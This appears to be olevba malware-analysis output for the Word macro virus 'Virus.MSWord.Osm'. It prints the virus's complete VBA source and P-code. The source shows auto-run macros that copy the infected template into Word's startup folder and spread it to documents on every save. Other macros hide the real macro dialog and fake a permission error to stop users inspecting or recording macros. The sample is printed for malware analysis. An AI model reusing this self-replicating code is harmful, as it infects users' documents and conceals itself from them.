olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Osm
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Osm - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_New()

End Sub
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: Virus.MSWord.Osm - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function FCopy Lib "kernel32" Alias "CopyFileA" (ByVal src As String, ByVal dest As String, ByVal FailExist As Boolean) As Boolean
Sub AutoExec()
    On Error GoTo p0p
    If FileLen(Application.StartupPath + "\Startup.dot") < 10 Then MsgBox ("1")
    Exit Sub
    
p0p:
    Insert
End Sub

Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Macro created 03/11/98 by ITSC"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "TemplateProject.NewMacros.AutoOpen"
    On Error GoTo p0p
    If FileLen(Application.StartupPath + "\Startup.dot") < 10 Then MsgBox ("1")
    Exit Sub
    
p0p:
    Insert
    EntryPoint
End Sub
Sub AutoClose()
    Application.NormalTemplate.Saved = True
End Sub

Sub Insert()
    On Error Resume Next
    Application.ScreenUpdating = False
    
    Dim src, dest As String
    dest = Application.StartupPath + "\Startup.dot"
    src = ActiveDocument.AttachedTemplate.FullName
       
    FCopy src, dest, False
    
    Application.ScreenUpdating = True

End Sub

Sub Copy()
    On Error Resume Next
    Dim src, dest As String
    dest = ActiveDocument.Path + "\Default.dot"
    src = Application.StartupPath + "\Startup.dot"
    
    Application.ScreenUpdating = False
    FCopy src, dest, False
        
    ActiveDocument.AttachedTemplate = dest
    ActiveDocument.Save
    
    Application.ScreenUpdating = True
End Sub
Sub FileSave()

    ActiveDocument.Save
    Copy
End Sub
Sub FileSaveAs()

    Dialogs(wdDialogFileSaveAs).Show
    Copy
End Sub

Sub ToolsMacro()
    On Error Resume Next
    Load dlgMyMacs
    
    dlgMyMacs.cmbIn.Clear
    dlgMyMacs.TextBox1.Text = ""
    dlgMyMacs.cmbIn.AddItem "All active templates and documents"
    dlgMyMacs.cmbIn.SelText = "All active templates and documents"
    dlgMyMacs.cmbIn.AddItem "Normal (global template)"
    dlgMyMacs.cmbIn.AddItem "Word commands"
    dlgMyMacs.cmbIn.AddItem ActiveDocument.Name + " (document)"
    
    dlgMyMacs.Show

End Sub

Sub ToolsRecordMacroToggle()
Attribute ToolsRecordMacroToggle.VB_Description = "Turns macro recording on or off"
Attribute ToolsRecordMacroToggle.VB_ProcData.VB_Invoke_Func = "TemplateProject.NewMacros.ToolsRecordMacroToggle"
    MsgBox "You do not have permission to create macros on this computer.", vbOKOnly, "Microsoft Word"
End Sub

Sub EntryPoint()
    ThisDocument.Shapes(1).Activate
    ThisDocument.Saved = True
End Sub

Sub Show()
    ThisDocument.Shapes(1).Visible = msoTrue
End Sub

Sub Hide()
    ThisDocument.Shapes(1).Visible = msoFalse
End Sub
-------------------------------------------------------------------------------
VBA MACRO dlgMyMacs.frm 
in file: Virus.MSWord.Osm - OLE stream: 'Macros/VBA/dlgMyMacs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub CommandButton3_Click()
    dlgMyMacs.Hide
End Sub

Private Sub CommandButton4_Click()
    dlgMyMacs.Hide
End Sub

Private Sub CommandButton6_Click()
    MsgBox "You do not have permission to create macros on this computer.", vbOKOnly, "Microsoft Word"
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Osm
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 2330 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_New())
' Line #1:
' Line #2:
' 	EndSub 
' Macros/VBA/NewMacros - 14514 bytes
' Line #0:
' 	FuncDefn (Private Declare Function FCopy Lib "kernel32" (ByVal src As String, ByVal dest As String, ByVal FailExist As Boolean) As Boolean)
' Line #1:
' 	FuncDefn (Sub AutoExec())
' Line #2:
' 	OnError p0p 
' Line #3:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000C "\Startup.dot"
' 	Add 
' 	ArgsLd FileLen 0x0001 
' 	LitDI2 0x000A 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "1"
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' 	EndIf 
' Line #4:
' 	ExitSub 
' Line #5:
' Line #6:
' 	Label p0p 
' Line #7:
' 	ArgsCall Insert 0x0000 
' Line #8:
' 	EndSub 
' Line #9:
' Line #10:
' 	FuncDefn (Sub AutoOpen())
' Line #11:
' 	OnError p0p 
' Line #12:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000C "\Startup.dot"
' 	Add 
' 	ArgsLd FileLen 0x0001 
' 	LitDI2 0x000A 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "1"
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' 	EndIf 
' Line #13:
' 	ExitSub 
' Line #14:
' Line #15:
' 	Label p0p 
' Line #16:
' 	ArgsCall Insert 0x0000 
' Line #17:
' 	ArgsCall EntryPoint 0x0000 
' Line #18:
' 	EndSub 
' Line #19:
' 	FuncDefn (Sub AutoClose())
' Line #20:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemLd NormalTemplate 
' 	MemSt Saved 
' Line #21:
' 	EndSub 
' Line #22:
' Line #23:
' 	FuncDefn (Sub Insert())
' Line #24:
' 	OnError (Resume Next) 
' Line #25:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #26:
' Line #27:
' 	Dim 
' 	VarDefn src
' 	VarDefn dest (As String)
' Line #28:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000C "\Startup.dot"
' 	Add 
' 	St dest 
' Line #29:
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	MemLd FullName 
' 	St src 
' Line #30:
' Line #31:
' 	Ld src 
' 	Ld dest 
' 	LitVarSpecial (False)
' 	ArgsCall FCopy 0x0003 
' Line #32:
' Line #33:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #34:
' Line #35:
' 	EndSub 
' Line #36:
' Line #37:
' 	FuncDefn (Sub Copy())
' Line #38:
' 	OnError (Resume Next) 
' Line #39:
' 	Dim 
' 	VarDefn src
' 	VarDefn dest (As String)
' Line #40:
' 	Ld ActiveDocument 
' 	MemLd Path 
' 	LitStr 0x000C "\Default.dot"
' 	Add 
' 	St dest 
' Line #41:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000C "\Startup.dot"
' 	Add 
' 	St src 
' Line #42:
' Line #43:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #44:
' 	Ld src 
' 	Ld dest 
' 	LitVarSpecial (False)
' 	ArgsCall FCopy 0x0003 
' Line #45:
' Line #46:
' 	Ld dest 
' 	Ld ActiveDocument 
' 	MemSt AttachedTemplate 
' Line #47:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #48:
' Line #49:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #50:
' 	EndSub 
' Line #51:
' 	FuncDefn (Sub FileSave())
' Line #52:
' Line #53:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #54:
' 	ArgsCall Copy 0x0000 
' Line #55:
' 	EndSub 
' Line #56:
' 	FuncDefn (Sub FileSaveAs())
' Line #57:
' Line #58:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #59:
' 	ArgsCall Copy 0x0000 
' Line #60:
' 	EndSub 
' Line #61:
' Line #62:
' 	FuncDefn (Sub ToolsMacro())
' Line #63:
' 	OnError (Resume Next) 
' Line #64:
' 	Ld dlgMyMacs 
' 	ArgsCall Local 0x0001 
' Line #65:
' Line #66:
' 	Ld dlgMyMacs 
' 	MemLd cmbIn 
' 	ArgsMemCall Clear 0x0000 
' Line #67:
' 	LitStr 0x0000 ""
' 	Ld dlgMyMacs 
' 	MemLd TextBox1 
' 	MemSt Then 
' Line #68:
' 	LitStr 0x0022 "All active templates and documents"
' 	Ld dlgMyMacs 
' 	MemLd cmbIn 
' 	ArgsMemCall AddItem 0x0001 
' Line #69:
' 	LitStr 0x0022 "All active templates and documents"
' 	Ld dlgMyMacs 
' 	MemLd cmbIn 
' 	MemSt SelText 
' Line #70:
' 	LitStr 0x0018 "Normal (global template)"
' 	Ld dlgMyMacs 
' 	MemLd cmbIn 
' 	ArgsMemCall AddItem 0x0001 
' Line #71:
' 	LitStr 0x000D "Word commands"
' 	Ld dlgMyMacs 
' 	MemLd cmbIn 
' 	ArgsMemCall AddItem 0x0001 
' Line #72:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x000B " (document)"
' 	Add 
' 	Ld dlgMyMacs 
' 	MemLd cmbIn 
' 	ArgsMemCall AddItem 0x0001 
' Line #73:
' Line #74:
' 	Ld dlgMyMacs 
' 	ArgsMemCall Show 0x0000 
' Line #75:
' Line #76:
' 	EndSub 
' Line #77:
' Line #78:
' 	FuncDefn (Sub ToolsRecordMacroToggle())
' Line #79:
' 	LitStr 0x003D "You do not have permission to create macros on this computer."
' 	Ld vbOKOnly 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #80:
' 	EndSub 
' Line #81:
' Line #82:
' 	FuncDefn (Sub EntryPoint())
' Line #83:
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	ArgsMemLd Shapes 0x0001 
' 	ArgsMemCall Activate 0x0000 
' Line #84:
' 	LitVarSpecial (True)
' 	Ld ThisDocument 
' 	MemSt Saved 
' Line #85:
' 	EndSub 
' Line #86:
' Line #87:
' 	FuncDefn (Sub Show())
' Line #88:
' 	Ld msoTrue 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	ArgsMemLd Shapes 0x0001 
' 	MemSt Visible 
' Line #89:
' 	EndSub 
' Line #90:
' Line #91:
' 	FuncDefn (Sub Hide())
' Line #92:
' 	Ld msoFalse 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	ArgsMemLd Shapes 0x0001 
' 	MemSt Visible 
' Line #93:
' 	EndSub 
' Macros/VBA/dlgMyMacs - 3297 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub CommandButton3_Click())
' Line #2:
' 	Ld dlgMyMacs 
' 	ArgsMemCall Hide 0x0000 
' Line #3:
' 	EndSub 
' Line #4:
' Line #5:
' 	FuncDefn (Private Sub CommandButton4_Click())
' Line #6:
' 	Ld dlgMyMacs 
' 	ArgsMemCall Hide 0x0000 
' Line #7:
' 	EndSub 
' Line #8:
' Line #9:
' 	FuncDefn (Private Sub CommandButton6_Click())
' Line #10:
' 	LitStr 0x003D "You do not have permission to create macros on this computer."
' 	Ld vbOKOnly 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #11:
' 	EndSub 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Osm' - OLE stream: 'Macros/dlgMyMacs/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�,? 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Osm' - OLE stream: 'Macros/dlgMyMacs/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Macro name:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Osm' - OLE stream: 'Macros/dlgMyMacs/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Osm' - OLE stream: 'Macros/dlgMyMacs/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Macros in:o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Osm' - OLE stream: 'Macros/dlgMyMacs/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Osm' - OLE stream: 'Macros/dlgMyMacs/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Description:q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Osm' - OLE stream: 'Macros/dlgMyMacs/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Osm' - OLE stream: 'Macros/dlgMyMacs/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�,? 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Osm' - OLE stream: 'Macros/dlgMyMacs/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Osm' - OLE stream: 'Macros/dlgMyMacs/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Close
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Osm' - OLE stream: 'Macros/dlgMyMacs/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Osm' - OLE stream: 'Macros/dlgMyMacs/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Step IntouK
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Osm' - OLE stream: 'Macros/dlgMyMacs/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Osm' - OLE stream: 'Macros/dlgMyMacs/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Edit�

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Osm' - OLE stream: 'Macros/dlgMyMacs/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Osm' - OLE stream: 'Macros/dlgMyMacs/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Create@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Osm' - OLE stream: 'Macros/dlgMyMacs/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Osm' - OLE stream: 'Macros/dlgMyMacs/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Delete@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Osm' - OLE stream: 'Macros/dlgMyMacs/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Osm' - OLE stream: 'Macros/dlgMyMacs/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�OrganizeruK
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Osm' - OLE stream: 'Macros/dlgMyMacs/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Virus.MSWord.Osm' - OLE stream: 'Macros/dlgMyMacs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Osm' - OLE stream: 'Macros/dlgMyMacs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'cmbIn'" IN 'Virus.MSWord.Osm' - OLE stream: 'Macros/dlgMyMacs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Osm' - OLE stream: 'Macros/dlgMyMacs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Osm' - OLE stream: 'Macros/dlgMyMacs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox2'" IN 'Virus.MSWord.Osm' - OLE stream: 'Macros/dlgMyMacs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Osm' - OLE stream: 'Macros/dlgMyMacs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton3'" IN 'Virus.MSWord.Osm' - OLE stream: 'Macros/dlgMyMacs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton4'" IN 'Virus.MSWord.Osm' - OLE stream: 'Macros/dlgMyMacs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton5'" IN 'Virus.MSWord.Osm' - OLE stream: 'Macros/dlgMyMacs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton6'" IN 'Virus.MSWord.Osm' - OLE stream: 'Macros/dlgMyMacs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton7'" IN 'Virus.MSWord.Osm' - OLE stream: 'Macros/dlgMyMacs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton8'" IN 'Virus.MSWord.Osm' - OLE stream: 'Macros/dlgMyMacs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox1'" IN 'Virus.MSWord.Osm' - OLE stream: 'Macros/dlgMyMacs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |CommandButton3_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

